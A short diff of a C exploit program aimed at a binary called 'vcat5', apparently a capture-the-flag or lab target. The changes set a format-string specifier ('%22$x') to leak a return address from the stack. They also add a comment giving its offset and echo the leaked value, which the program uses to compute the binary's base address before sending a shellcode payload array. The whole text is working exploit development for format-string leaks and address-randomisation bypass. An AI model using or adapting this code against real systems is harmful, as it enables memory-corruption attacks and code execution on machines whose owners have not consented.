@@ -15,8 +15,11 @@
 
 #define	MAX_VAL		0xF0000000UL
 #define	BUF_SZ		sizeof("0x00000000")
-#define	FMT_STR		"0x%08x"	/* FIXME	*/
+#define	FMT_STR		"%22$x"	/* FIXME	*/
 #define BIN_BASE_OFF	0x0		/* FIXME	*/
+
+// To leak return address: %22$x (which has offset 0x15c4 from the start of the file)
+
 
 unsigned char payload[] =
 	/* ------------------------------------	*/
@@ -48,6 +51,7 @@ main(int argc, char **argv)
 	/* leak the base address of `vcat5'	*/
 	write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
 	read(STDIN_FILENO, buf, BUF_SZ-1);
+	write(STDOUT_FILENO, buf, BUF_SZ-1);
 	baddr = strtoul(buf, NULL, 16) - BIN_BASE_OFF;
 
 	/* sanity check 			*/
